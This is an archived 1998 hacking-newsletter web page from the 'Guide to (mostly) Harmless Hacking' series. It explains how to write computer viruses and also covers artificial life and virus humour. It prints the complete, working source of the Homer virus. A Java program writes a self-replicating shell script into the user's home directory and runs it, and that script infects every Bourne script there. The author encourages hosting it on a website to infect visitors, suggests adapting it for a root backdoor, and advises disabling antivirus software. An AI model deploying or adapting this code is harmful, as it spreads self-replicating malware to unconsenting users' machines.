@@ -1,0 +1,612 @@
+<HTML>
+<HEAD>
+     <TITLE>Virii 2</TITLE>
+</HEAD>
+<BODY>
+<br>
+<B><I><FONT SIZE=+1>Warning: if you live in a country where information
+on how to write computer</FONT></I></B>
+<BR><B><I><FONT SIZE=+1>viruses is illegal, please leave now!</FONT></I></B>
+<BR>___________________________________________________________
+<BR>GUIDE TO (mostly) HARMLESS HACKING
+
+<P>Vol. 3 No. 7, part 2
+
+<P>Introduction to Computer Viruses
+<BR>____________________________________________________________
+
+<P>Part Two:
+
+<P>* How to write them
+<BR>* How to write them and not get lynched
+<BR>* Artificial life
+<BR>* Virus humor
+<BR>****************************************************************
+
+<P>How to Write Them
+
+<P>&nbsp;Wait!&nbsp; Wait!&nbsp; This is supposed to be about mostly harmless
+hacking!&nbsp; Is
+<BR>Carolyn really going to tell all the newbies how to write computer
+viruses?
+<BR>&nbsp;Yes, I am.&nbsp; I will tell you how to really write computer
+viruses, not just
+<BR>use some lamer program like Virus Workshop that writes weak, helpless
+little
+<BR>viruses for you. However, to use the information in this Guide you
+must know
+<BR>how to compile Java or use assembly language.&nbsp; If you can master
+these, you
+<BR>probably have enough willingness to work hard that you will not abuse
+the
+<BR>knowledge of how to code viruses.&nbsp; At least that's my theory --
+please don't
+<BR>prove me wrong!
+<BR>&nbsp;Besides, the only way to fight dangerous viruses is to know exactly
+how to
+<BR>write them.
+<BR>&nbsp;First, if you are like me, you may already be struggling with
+the
+<BR>temptation to install a Java virus on your Web site to infect unwary
+<BR>visitors.&nbsp; Yes, I really am going to show you how to do this.&nbsp;
+However, it
+<BR>is a (mostly) harmless virus.&nbsp; (Aw, darn!)
+
+<P>****************************************************************
+<BR>You can go to jail warning:&nbsp; This Guide only offers source code
+for a
+<BR>(mostly) harmless virus.&nbsp; However, some people are so terrified
+of and
+<BR>ignorant about viruses that you just might get into big trouble if
+you
+<BR>really put this Java virus on your Web page.&nbsp; Suggestion: if you
+absolutely
+<BR>cannot resist, how about putting it on a link with the flashing message
+<BR>"Danger! Do not click here!&nbsp; If you do, you might catch a virus!&nbsp;
+Honest!!!
+<BR>Would I lie to you?!!??"
+<BR>****************************************************************
+
+<P>****************************************************************
+<BR>You can get punched in the nose warning: Some people don't care if
+a virus
+<BR>is (mostly) harmless or even entirely harmless.&nbsp; These guys are
+terrified of
+<BR>viruses.&nbsp; If some guy who browses your Web site catches your virus
+and has a
+<BR>fit and sues you or tracks you down and punches you in the nose, remember,
+<BR>you asked for it.&nbsp; Don't expect me to feel sorry for you.
+<BR>*****************************************************************
+
+<P>&nbsp;OK, folks, here it is, a Java virus.&nbsp; The following source
+code for the
+<BR>Homer virus is available on the floppy disk that accompanies "The Giant
+<BR>Black Book of Computer Viruses" by Dr. Mark Ludwig:
+
+<P>/* Homer.java by Mark D. LaDue */
+
+<P>/* December 7, 1996 */
+
+<P>/*&nbsp; Copyright (c) 1996 Mark D. LaDue
+<BR>&nbsp;&nbsp;&nbsp; You may study, use, modify, and distribute this
+example for any purpose.
+<BR>&nbsp;&nbsp;&nbsp; This example is provided WITHOUT WARRANTY either
+expressed or implied.&nbsp; */
+
+<P>/* This Java application infects your UNIX system with a Bourne shell
+<BR>&nbsp;&nbsp; script virus, homer.sh.&nbsp; homer.sh is kind enough
+to announce itself
+<BR>&nbsp;&nbsp; and inform you that "Java is safe, and UNIX viruses do
+not exist"
+<BR>&nbsp;&nbsp; before finding all of the Bourne shell scripts in your
+home directory,
+<BR>&nbsp;&nbsp; checking to see if they've already been infected, and
+infecting
+<BR>&nbsp;&nbsp; those that are not.&nbsp; homer.sh infects another Bourne
+shell script
+<BR>&nbsp;&nbsp; by simply appending a working copy of itself to the end
+of that shell
+<BR>&nbsp;&nbsp; script.&nbsp; */
+<BR>&nbsp;
+
+<P>import java.io.*;
+
+<P>class Homer {
+<BR>&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
+<BR>&nbsp;&nbsp;&nbsp; try {
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String userHome = System.getProperty("user.home");
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String target = "$HOME";
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileOutputStream outer =
+new FileOutputStream(userHome + "/.homer.sh");
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String homer = "#!/bin/sh"
++ "\n" + "#-_" + "\n" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "echo \"Java is safe, and
+UNIX viruses do not exist.\"" + "\n" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "for file in `find " + target
++ " -type f -print`" + "\n" + "do" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\n" + "&nbsp;&nbsp;&nbsp;
+case \"`sed 1q $file`\" in" + "\n" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+\"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; " || sed -n '/#-_/,$p' $0
+>> $file" + "\n" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp; esac"
++ "\n" + "done" + "\n" +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "2>/dev/null";
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] buffer = new byte[homer.length()];
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; homer.getBytes(0, homer.length(),
+buffer, 0);
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outer.write(buffer);
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outer.close();
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod
+777 " +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+userHome + "/.homer.sh");
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Process exec = Runtime.getRuntime().exec("/bin/sh
+" + userHome +
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"/.homer.sh");
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (IOException ioe)
+{}
+<BR>&nbsp;&nbsp;&nbsp; }
+<BR>}
+
+<P>&nbsp;If you post this source code to you web site -- it will do nothing!&nbsp;
+That
+<BR>is because this code must first be compiled in order to do its business.&nbsp;
+If
+<BR>you don't know how to compile Java source code for your Web page, you
+don't
+<BR>know enough to safely handle viruses.
+<BR>&nbsp;Also, you need to put the code for the shell script, homer.sh,
+on your Web
+<BR>site so this Java program can ship it to your victims.&nbsp; Following
+is the
+<BR>code for homer.sh:
+<BR>&nbsp;
+
+<P>#!/bin/sh
+
+<P>#-_
+
+<P>echo "Java is safe, and UNIX viruses do not exist."
+
+<P>for file in `find $HOME -type f -print`
+
+<P>do
+
+<P>&nbsp;&nbsp;&nbsp; case "`sed 1q $file`" in
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "#!/bin/sh" ) grep '#-_'
+$file > /dev/null || sed -n '/#-_/,$p' $0
+<BR>>> $file
+
+<P>&nbsp;&nbsp;&nbsp; esac
+
+<P>done
+
+<P>&nbsp;2>/dev/null
+
+<P>&nbsp;In case you are wondering what this virus does -- it flashes a
+message on
+<BR>the victim's screen reading "Java is safe, and UNIX viruses do not
+exist."
+<BR>For more information on how shell scripts work, see the GTMHHs on shell
+<BR>programming.)
+<BR>&nbsp;Homer is a harmless, humorous shell virus.&nbsp; However, it
+doesn't take a
+<BR>genius to see how it could be given a destructive payload by modifying
+<BR>homer.sh.&nbsp; If someone were to be dumb enough to surf your booby-trapped
+<BR>Website while logged in as root, it would be trivial to use a homer.sh
+<BR>modified to give you a root shell with your very own back door.
+<BR>&nbsp;However, in general Java viruses are not terribly dangerous because
+they
+<BR>run so slowly.&nbsp; This gives their victims time to get suspicious
+and
+<BR>terminate these programs.&nbsp; Presumably a Java virus would take
+so long to
+<BR>create a root shell and back door that the victim would kill the process
+in
+<BR>time.
+
+<P>********************************************************************
+<BR>Newbie note: Don't ever surf the Web while logged in as root. Don't
+ever try
+<BR>to break into someone else's computer while logged in as root.&nbsp;
+Any time you
+<BR>are running as root, it is really easy for you to mess up your Unix
+<BR>computer.&nbsp; If you check out the phf abuse log at the Hacker Wargame
+section
+<BR>of <A HREF="http://www.happyhacker.org">http://www.happyhacker.org</A>,
+you will see that quite a few people have
+<BR>tried to break into our webserver while running a Web browser and logged
+in
+<BR>as root.
+<BR>********************************************************************
+
+<P>&nbsp;The problem of some programs running really slowly is a major
+reason why
+<BR>you can't do much as a virus or antivirus programmer unless you also
+learn
+<BR>at least one assembly language.&nbsp; Assembly language is fast!&nbsp;
+No time for the
+<BR>victim to react!&nbsp; It also makes it easy for you to do complex
+and
+<BR>infuriating things while a computer is only beginning to boot up.&nbsp;
+For DOS
+<BR>and Windows you will need an assembly language compiler for 80x86
+<BR>(substitute 2, 3, 4, 5)/Pentium type computers.&nbsp; Two of the best
+are
+<BR>Microsoft Macro Assembler and Borland Turbo Assembler.&nbsp; Places
+where you can
+<BR>get them (you have to pay, they are not free) include
+<BR><A HREF="http://www.pparadise.com">http://www.pparadise.com</A> and
+<A HREF="http://www.supershops.com">http://www.supershops.com</A>.
+<BR>&nbsp;If you are really serious about learning how to write viruses
+and
+<BR>antiviruses, you may want to get the "Giant Black Book of Computer
+Viruses,
+<BR>Second Edition," by Dr. Mark Ludwig.&nbsp; Not only is he one of the
+world's
+<BR>leading virus researchers -- he also is the only one I have discovered
+who
+<BR>will tell you EXACTLY in almost endless detail how to write viruses
+and
+<BR>antiviruses of many sorts.&nbsp; However, this book is not for newbies.&nbsp;
+He
+<BR>assumes you already know a great deal about DOS, Windows and Unix,
+and are a
+<BR>programmer.
+<BR>&nbsp;It comes with a floppy disk with source code for many viruses.&nbsp;
+Here are
+<BR>some hints for how to extract these viruses from this disk successfully
+and
+<BR>without killing your computer.
+
+<P>1) This disk is designed to be installed from MS-DOS.&nbsp; If you try
+to install
+<BR>it from Windows, it will give you a runtime error.&nbsp; If you don't
+know how to
+<BR>work from MS-DOS, you aren't ready for this book.
+
+<P>2) The installation program for Dr. Ludwig's virus disk ought to activate
+<BR>your antivirus program.&nbsp; If it doesn't, your antivirus program
+is even more
+<BR>worthless than most.&nbsp; To be certain that you can succeed in installing
+a
+<BR>directory full of viruses, deactivate your antivirus program(s) first.&nbsp;
+If
+<BR>this sounds too scary to you, don't buy this book! If you mess up your
+<BR>computer by following my advice, too bad, that's what you get for playing
+<BR>with viruses.
+
+<P>3) Here's what Dr. Ludwig's installation program will tell you:
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+! ! W A R N I N G ! !
+
+<P>If you're like most computer users, you've grown used to being pampered.
+<BR>That's a nice way of saying that software developers no longer expect
+you to
+<BR>have a brain. Like a stupid monkey, all you need to do is put the CD
+in the
+<BR>drive and let it auto-execute, or put the floppy disk in the drive
+and type
+<BR>"setup".
+
+<P>If that's what you want and need, THEN DELETE THIS SOFTWARE OFF YOUR
+<BR>COMPUTER IMMEDIATELY AND DESTROY THE DISK WITH A HAMMER! We're really
+not
+<BR>kidding about that. This disk is for thinking beings. Improperly used
+it
+<BR>could be very dangerous. It could ruin your computer, your career and
+your
+<BR>life. THAT IS NOT A JOKE.
+
+<P>DO NOT EXECUTE ANY PROGRAM IN THIS DIRECTORY UNLESS YOU KNOW WHAT IT
+DOES.
+
+<P>DO NOT EXECUTE ANY PROGRAM IN THIS DIRECTORY EXCEPT IN A CONTROLLED
+ENVIRONMENT.
+
+<P>&nbsp;I suppose now you just can't resist buying this book.&nbsp; Guess
+what -- you
+<BR>can't get it in any bookstore.&nbsp; They are all afraid of getting
+sued.&nbsp; Also,
+<BR>in some countries, mere possession of "The Giant Black Book of Computer
+<BR>Viruses" is illegal.&nbsp; Just to be safe, you might want to delete
+this GTMHH
+<BR>right now and only read it from our Web site at <A HREF="http://www.happyhacker.org">http://www.happyhacker.org</A>.
+<BR>&nbsp;If you are absolutely determined to get this book, within the
+US you can
+<BR>order it from American Eagle Publications by phoning toll free 800-719-4957;
+<BR>outside the US you can order it by calling (insert country code here)
+<BR>520-367-1621.&nbsp; It costs $39.95.&nbsp; This price includes the
+floppy disk with
+<BR>all that stuff that upsets your antivirus program.&nbsp; Shipping and
+handling
+<BR>costs are extra.
+<BR>&nbsp;If you live within the US, you can also buy "The Giant Black
+Book of
+<BR>Computer Viruses" by sending $44.95 (this includes shipping by Priority
+<BR>mail, which is supposed to take two days) made out to M/B Research,
+PO Box
+<BR>1520, Cedar Crest NM 87008.&nbsp; That's my company.&nbsp; Sorry, I'm
+not going to
+<BR>ship the book outside the US because I don't know in which countries
+it is
+<BR>illegal.&nbsp; I would feel really bad if you were to go to your post
+office to
+<BR>pick up the book and instead got picked up by the police.
+<BR>&nbsp;American Eagle can get the book to you at the lowest shipping
+cost, if you
+<BR>don't mind it taking a long time to get to you.&nbsp; I can get it
+to you faster,
+<BR>but it costs you more for the shipping.
+<BR>&nbsp;If you want to buy "The Giant Black Book of Computer Viruses"
+with a credit
+<BR>card over the Internet, check out <A HREF="http://www.amazon.com">http://www.amazon.com</A>
+and
+<BR><A HREF="http://www.infowar.com">http://www.infowar.com</A>.&nbsp;
+Amazon.com will usually take much longer to get the
+<BR>book to you than any other book seller, however.
+<BR>&nbsp;
+<BR>How to Write Viruses and Not Get Lynched
+<BR>&nbsp;
+<BR>&nbsp;Just imagine how people will react when you are at some party
+full of
+<BR>ambitious young professionals.&nbsp; Everyone is trading business cards.&nbsp;
+You
+<BR>hand out ones that say "George the Doomster.&nbsp; Computer virus design.&nbsp;
+Free
+<BR>samples, muhahaha."&nbsp; You'll be real popular, yes sirree!
+<BR>&nbsp;OK, so you only plan on writing harmless viruses.&nbsp; Try to
+tell that to the
+<BR>lynch mob that may pay you a visit when they discover it was you who
+wrote
+<BR>the code that made their Win95 computers come down with habitual General
+<BR>Protection Faults.&nbsp; Remember, even the virus designer who has
+the best of
+<BR>intentions may write a seemingly harmless or even beneficial virus
+that
+<BR>turns out to have a bug in the code that accidentally does harm.&nbsp;
+Also,
+<BR>since the best viruses are memory resident (they hide in RAM memory)
+they
+<BR>really can help create General Protection Faults just by hogging too
+much
+<BR>memory.
+<BR>&nbsp;Besides, people like to pick and choose what programs run on
+their
+<BR>computers.&nbsp; Imagine that!&nbsp; If you design a virus so it will
+sneak into
+<BR>computers, don't expect people to thank you and admire you.&nbsp; If
+you do
+<BR>choose to code a virus, please consider coding politeness into it.&nbsp;
+You
+<BR>could have it ask permission to take up residence on each new computer
+and
+<BR>leave when asked.&nbsp; Shoot, if I could find a copy of that virus
+that makes a
+<BR>mirror image of Windows desktop graphics each Saturday, and if I knew
+how to
+<BR>uninstall it without paying a bunch of money to Panda Software, I'd
+enjoy
+<BR>sharing my computer with it.
+
+<P>Artificial Life
+
+<P>&nbsp;Now that you understand the basic principles of virus coding,
+let's take a
+<BR>look at the Big Time: using your programming talents to create -- or
+battle
+<BR>against -- artificial life.
+<BR>&nbsp;Just what is artificial life (insiders call it "alife"), anyhow?
+According
+<BR>to the most prominent researcher in this field, Dr. Chris Langton,
+<BR>artificial life is "... the study of man-made systems that exhibit
+<BR>behaviours characteristic of natural living systems." -- "Artificial
+Life,"
+<BR>edited by Chris Langton, Addison-Wesley, 1988.&nbsp; Youc an get this
+book from
+<BR><A HREF="http://www.amazon.com">http://www.amazon.com</A>.
+<BR>&nbsp;There are three primary forms of alife.&nbsp; Some alife is growing
+-- or trying
+<BR>to grow -- in test tubes full of RNA (ribonucleic acid) or other chemicals.
+<BR>The second major form of alife consists of computerized robots which
+their
+<BR>creators hope to will someday achieve the ability to adapt and reproduce
+<BR>without human assistance.&nbsp; The third type of alife is computer
+programs that
+<BR>exist, adapt, reproduce and evolve in the virtual landscape of cyberspace
+--
+<BR>what we know as computer viruses.
+<BR>&nbsp;Of all the forms of artificial life, computer viruses are the
+only ones so
+<BR>far that reproduce, escape the laboratory and take up life in the wild.
+<BR>Viruses that follow rules of good behavior -- only living in computers
+when
+<BR>invited -- are often created by alife researchers.
+<BR>&nbsp;How can you meet and get involved with alife designers?
+<BR><A HREF="http://alife.santafe.edu/alife/events/">http://alife.santafe.edu/alife/events/</A>
+and <A HREF="http://alife6.alife.org/">http://alife6.alife.org/</A> offer
+<BR>listings of upcoming conferences on this topic from around the world.
+<BR>Closely related to artificial life is the Berkeley Initiative in Soft
+<BR>Computing (BISC) at <A HREF="http://http.cs.berkeley.edu/projects/Bisc">http://http.cs.berkeley.edu/projects/Bisc</A>.&nbsp;
+If you want
+<BR>to volunteer to harbor artificial life viruses on your computer or
+LAN, you
+<BR>can probably find a researcher at one of these sites who would be happy
+to
+<BR>give you some of his or her harmless (you hope) creations.
+<BR>&nbsp;American Eagle also sells a book "Computer Viruses, Artificial
+Life and
+<BR>Evolution" by Dr. Ludwig (American Eagle, 1993).&nbsp; It costs $26.95
+and is
+<BR>almost impossible to get unless you order it directly from American
+Eagle.
+
+<P>Virus Humor
+
+<P>&nbsp;As we end this Guide, please remember that with the right attitude,
+viruses
+<BR>actually can be fun!&nbsp; Next time your computer gets infected by
+one, just
+<BR>remember, don't worry, be happy.&nbsp; Following is some virus humor
+to show how
+<BR>other people have coped cheerfully with an encounter with this pesky
+new
+<BR>life form.
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+"The Worm Before Christmas"
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+by Clement C. Morris
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (a.k.a.
+David Bradley, Betty Cheng, Hal Render,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Greg Rogers, and Dan LaLiberte)
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Twas the night before finals,
+and all through the lab
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Not a student was sleeping,
+not even McNabb.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Their projects were finished,
+completed with care
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; In hopes that the grades
+would be easy (and fair).
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The students were wired with
+caffeine in their veins
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; While visions of quals nearly
+drove them insane.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; With piles of books and
+a brand new highlighter,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I had just settled down
+for another all nighter ---
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; When out from our gateways
+arose such a clatter,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I sprang from my desk to
+see what was the matter;
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Away to the console I flew
+like a flash,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And logged in as root to
+fend off a crash.
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The windows displayed on
+my brand new Sun-3,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gave oodles of info ---
+some in 3-D.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; When, what to my burning
+red eyes should appear
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; But dozens of "nobody" jobs.&nbsp;
+Oh dear!
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; With a blitzkrieg invasion,
+so virulent and firm,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I knew in a moment, it was
+Morris's Worm!
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; More rapid than eagles his
+processes came,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And they forked and exec'ed
+and they copied by name:
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "Now Dasher!&nbsp; Now Dancer!&nbsp;
+Now, Prancer and Vixen!
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On Comet!&nbsp; On Cupid!&nbsp;
+On Donner and Blitzen!
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; To the sites in .rhosts
+and host.equiv
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Now, dash away!&nbsp; dash
+away!&nbsp; dash away all!"
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And then in a twinkling,
+I heard on the phone,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The complaints of the users.&nbsp;
+(Thought I was alone!)
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "The load is too high!"&nbsp;
+"I can't read my files!"
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "I can't send my mail over
+miles and miles!"
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I unplugged the net, and
+was turning around,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; When the worm-ridden system
+went down with a bound.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I fretted.&nbsp; I frittered.&nbsp;
+I sweated.&nbsp; I wept.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Then finally I core dumped
+the worm in /tmp.
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It was smart and pervasive,
+a right jolly old stealth,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; And I laughed, when I saw
+it, in spite of myself.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A look at the dump of that
+invasive thread
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Soon gave me to know we
+had nothing to dread.
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The next day was slow with
+no network connections,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; For we wanted no more of
+those pesky infections.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; But in spite of the news
+and the noise and the clatter,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Soon all became normal,
+as if naught were the matter.
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Then later that month while
+all were away,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A virus came calling and
+then went away.
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The system then told us,
+when we logged in one night:
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "Happy Christmas to all!&nbsp;
+(You guys aren't so bright.)"
+
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ Note:&nbsp; The machines
+dasher.cs.uiuc.edu,
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dancer.cs.uiuc.ed,
+prancer.cs.uiuc.edu, etc. have
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; been renamed
+deer1, deer2, deer3, etc. so as not
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to confuse the
+already burdened students who use
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; those machines.
+We regret that this poem reflects
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the older naming
+scheme and hope it does not confuse
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the network
+administrator at your site.&nbsp; -Ed.]
+<BR>_______________________________________________________________________
+<BR>Where are those back issues of GTMHHs and Happy Hacker Digests? Check
+out
+<BR>the official Happy Hacker Web page at <A HREF="http://www.happyhacker.org">http://www.happyhacker.org</A>.
+<BR>We are against computer crime. We support good, old-fashioned hacking
+of the
+<BR>kind that led to the creation of the Internet and a new era of freedom
+of
+<BR>information. So don't email us about any crimes you have committed!&nbsp;
+And
+<BR>don't expect us to come to your rescue if you crash 100 million computers
+<BR>with some new Java virus you just unleashed.
+<BR>To subscribe to Happy Hacker and receive the Guides to (mostly) Harmless
+<BR>Hacking, please email <A HREF="mailto:hacker@techbroker.com">hacker@techbroker.com</A>
+with message "subscribe
+<BR>happy-hacker" in the body of your message.
+<BR>Copyright 1998 Carolyn P. Meinel &lt;<A HREF="mailto:cmeinel@techbroker.com">cmeinel@techbroker.com</A>>.
+You may forward,
+<BR>print out or post this GUIDE TO (mostly) HARMLESS HACKING on your Web
+site
+<BR>as long as you leave this notice at the end.
+<BR>_________________________________________________________
+<BR>Carolyn Meinel
+<BR>M/B Research -- The Technology Brokers
+<BR><A HREF="http://techbroker.com">http://techbroker.com</A>
+<BR>&nbsp;
+<BR>&nbsp;
+</BODY>
+</HTML>
